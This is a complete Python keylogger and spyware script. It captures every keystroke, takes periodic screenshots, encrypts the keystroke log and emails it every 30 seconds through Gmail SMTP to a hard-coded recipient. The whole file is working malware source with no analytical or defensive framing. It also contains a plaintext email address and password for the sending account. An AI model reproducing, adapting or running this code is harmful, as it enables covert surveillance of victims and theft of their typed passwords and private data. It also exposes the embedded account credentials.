import os
import time
import threading
import smtplib
import pyautogui  
from datetime import datetime
from pynput import keyboard
from cryptography.fernet import Fernet
from email.message import EmailMessage

# Configuration
SCREENSHOT_INTERVAL = 60       # seconds
SEND_INTERVAL = 30 # seconds (5 minutes)
LOG_FILE = "log.enc"
SCREENSHOT_DIR = "screenshots"
EMAIL_ADDRESS = "sbatman661@gmail.com"
EMAIL_PASSWORD = "Thebossbaby99@"
TO_EMAIL = "nagavmsi007@gmail.com"
KEY_FILE = "secret.key"

# Global buffer
log_data = ""

# ===== Key Management =====
def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)

def load_key():
    if not os.path.exists(KEY_FILE):
        generate_key()
    with open(KEY_FILE, "rb") as f:
        return f.read()

# ===== Encryption =====
def encrypt_log(data, key):
    fernet = Fernet(key)
    return fernet.encrypt(data.encode())

def save_encrypted_log(encrypted_data):
    with open(LOG_FILE, "wb") as f:
        f.write(encrypted_data)

# ===== Screenshot =====
def take_screenshot():
    if not os.path.exists(SCREENSHOT_DIR):
        os.makedirs(SCREENSHOT_DIR)
    filename = f"{SCREENSHOT_DIR}/screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
    pyautogui.screenshot(filename)

def screenshot_loop():
    while True:
        take_screenshot()
        time.sleep(SCREENSHOT_INTERVAL)

# ===== Keylogger =====
def on_press(key):
    global log_data
    try:
        log_data += key.char
    except AttributeError:
        log_data += f"[{key}]"

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# ===== Emailing =====
def send_email(subject, body, attachment_path=None):
    msg = EmailMessage()
    msg.set_content(body)
    msg['Subject'] = subject
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = TO_EMAIL

    if attachment_path and os.path.exists(attachment_path):
        with open(attachment_path, 'rb') as f:
            data = f.read()
            msg.add_attachment(data, maintype='application', subtype='octet-stream', filename=os.path.basename(attachment_path))

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
    except Exception as e:
        print(f"Email failed: {e}")

# ===== Log Manager =====
def log_saver_loop():
    global log_data
    key = load_key()

    while True:
        if log_data.strip():
            encrypted = encrypt_log(log_data, key)
            save_encrypted_log(encrypted)
            send_email("Encrypted Keylog", "See attachment.", LOG_FILE)
            log_data = ""
        time.sleep(SEND_INTERVAL)

# ===== Main =====
def main():
    # Start background threads
    threading.Thread(target=screenshot_loop, daemon=True).start()
    threading.Thread(target=log_saver_loop, daemon=True).start()
    start_keylogger()

if __name__ == "__main__":
    main()
